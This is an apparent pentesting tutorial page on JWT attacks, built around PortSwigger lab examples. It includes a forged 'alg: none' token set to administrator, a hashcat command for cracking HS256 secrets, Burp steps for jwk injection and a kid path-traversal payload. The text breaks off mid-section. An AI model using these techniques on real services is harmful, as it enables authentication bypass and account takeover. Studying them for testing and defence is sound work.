---
title: "JWT Attacks"
draft: false
images: []
description: "Json Web Tokens Attacks"
lead: "Json Web Tokens Attacks"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## Accepting arbitrary signatures

JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library jsonwebtoken has verify() and decode().

Occasionally, developers confuse these two methods and only pass incoming tokens to the decode() method. This effectively means that the application doesn't verify the signature at all.

#### Example:

```
{
    "username": "carlos",
    "isAdmin": false
}
```
```
{
    "username": "administrator",
    "isAdmin": false
}
```

## Accepting tokens with no signature

Among other things, the JWT header contains an alg parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.

JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the alg parameter is set to none, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.

#### Example: 

```
eyJraWQiOiJjYTI1YjdjYS1iNDZhLTQ1MDMtYjJkMC1lMWExYmYwYWRmNzQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NzI5MzU5Nn0.I8O_5wbwLfntRwLPCQvEMUW-_jkfXH-oPiEFLQ_4L2XmTzJHmaZsX2lBIEJjHp7AxwgQqYMmnwn-dc1w0L5q3uGzoMsAahIo3mbQ7__-cVZHZgpGynhc_RJ_Rd8rViW3mMUMNE1GH-SJRJqSc0oHL4JpV_M5xBxtjKfkC6tEAq2b72iWYuKunDsD1S-O1fT5zbizt5kxHfyde1JOAFvjMs8h6NK0lR3AmEVCW3rhdaA0HBww8vjRMcqBMW2eYpNBZnJmDIz5yUrpRjD2G_4h_GDgLPaU41zI8Zv-Ij6YbkyyNu0z94e9W2jmaabf2MW8jgkQq3-u-cmHXupAsSEkJw

{
  "kid": "ca25b7ca-b46a-4503-b2d0-e1a1bf0adf74",
  "alg": "RS256"
}
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1657293596
}
```
Modify the algorithm to "none" and the "sub" to administrator. 

Note: Even if the token is unsigned, the payload part must still be terminated with a trailing dot.

```
eyJraWQiOiJjYTI1YjdjYS1iNDZhLTQ1MDMtYjJkMC1lMWExYmYwYWRmNzQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTcyOTM1OTZ9.

{
  "kid": "ca25b7ca-b46a-4503-b2d0-e1a1bf0adf74",
  "alg": "none"
}
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1657293596
}
```

## Brute-forcing secret keys

Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature. 

You can use <a href="https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list" target="_blank">this wordlist</a>

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

## JWT header parameter injections
According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

* **jwk (JSON Web Key)** - Provides an embedded JSON object representing the key.

* **jku (JSON Web Key Set URL)** - Provides a URL from which servers can fetch a set of keys containing the correct key.

* **kid (Key ID)** - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

### Injecting self-signed JWTs via the jwk parameter

The JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format.

```
1. Go to the JWT Editor Keys tab in Burp's main tab bar.

2. Click New RSA Key.

3. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.

4. At the bottom of the JSON Web Token tab, click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK.

5. In the header of the JWT, observe that a jwk parameter has been added containing your public key.
```

### Injecting self-signed JWTs via the jku parameter

Instead of embedding public keys directly using the jwk header parameter, some servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.

JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /.well-known/jwks.json.

You can see an example of this below.

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

Then you can see <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection" target="_blank">this lab</a> to exploit the vulnerability.

### Injecting self-signed JWTs via the kid parameter

Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a kid (Key ID) parameter, which helps the server identify which key to use when verifying the signature.

Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same kid as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the kid parameter to point to a particular entry in a database, or even the name of a file.

If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.

```
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

Then you can see <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal" target="_blank">this lab</a> to exploit the vulnerability.

## Algorithm confusion attacks

Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. If this case isn't handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the server's secret signing key. 4201979